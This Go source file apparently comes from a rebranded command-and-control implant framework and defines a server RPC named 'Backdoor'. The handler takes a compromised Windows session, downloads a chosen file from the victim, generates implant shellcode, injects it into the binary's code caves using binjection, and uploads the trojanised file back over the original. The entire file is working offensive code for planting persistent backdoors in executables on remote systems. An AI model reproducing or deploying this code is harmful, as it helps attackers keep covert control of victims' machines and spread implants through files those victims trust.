package rpc

/*
	Revils Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"os"

	"github.com/Binject/binjection/bj"
	"github.com/Kevin-kitnick/revils/protobuf/clientpb"
	"github.com/Kevin-kitnick/revils/protobuf/commonpb"
	"github.com/Kevin-kitnick/revils/protobuf/revilspb"
	"github.com/Kevin-kitnick/revils/server/codenames"
	"github.com/Kevin-kitnick/revils/server/core"
	"github.com/Kevin-kitnick/revils/server/cryptography"
	"github.com/Kevin-kitnick/revils/server/generate"
	"github.com/Kevin-kitnick/revils/util/encoders"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

// Backdoor - Inject a revils payload in a file on the remote system
func (rpc *Server) Backdoor(ctx context.Context, req *revilspb.BackdoorReq) (*revilspb.Backdoor, error) {
	resp := &revilspb.Backdoor{}
	session := core.Sessions.Get(req.Request.SessionID)
	if session.OS != "windows" {
		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("%s is currently not supported", session.OS))
	}
	download, err := rpc.Download(context.Background(), &revilspb.DownloadReq{
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   req.Request.Timeout,
		},
		Path: req.FilePath,
	})
	if err != nil {
		return nil, err
	}
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			return nil, err
		}
	}

	profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	var p *clientpb.ImplantProfile
	for _, prof := range profiles.Profiles {
		if prof.Name == req.ProfileName {
			p = prof
		}
	}
	if p.GetName() == "" {
		return nil, fmt.Errorf("no profile found for name %s", req.ProfileName)
	}

	if p.Config.Format != clientpb.OutputFormat_SHELLCODE {
		return nil, fmt.Errorf("please select a profile targeting a shellcode format")
	}

	if p.Config.Name == "" {
		p.Config.Name, err = codenames.GetCodename()
		if err != nil {
			return nil, err
		}
	}

	name, config := generate.ImplantConfigFromProtobuf(p.Config)
	otpSecret, _ := cryptography.TOTPServerSecret()
	err = generate.GenerateConfig(name, config, true)
	if err != nil {
		return nil, err
	}
	fPath, err := generate.RevilsShellcode(name, otpSecret, config, true)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	shellcode, err := os.ReadFile(fPath)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	bjConfig := &bj.BinjectConfig{
		CodeCaveMode: true,
	}
	newFile, err := bj.Binject(download.Data, shellcode, bjConfig)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	uploadGzip := new(encoders.Gzip).Encode(newFile)
	// upload to remote target
	upload, err := rpc.Upload(context.Background(), &revilspb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    req.FilePath,
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   req.Request.Timeout,
		},
	})
	if err != nil {
		return nil, err
	}

	if upload.Response != nil && upload.Response.Err != "" {
		return nil, fmt.Errorf(upload.Response.Err)
	}

	return resp, nil
}
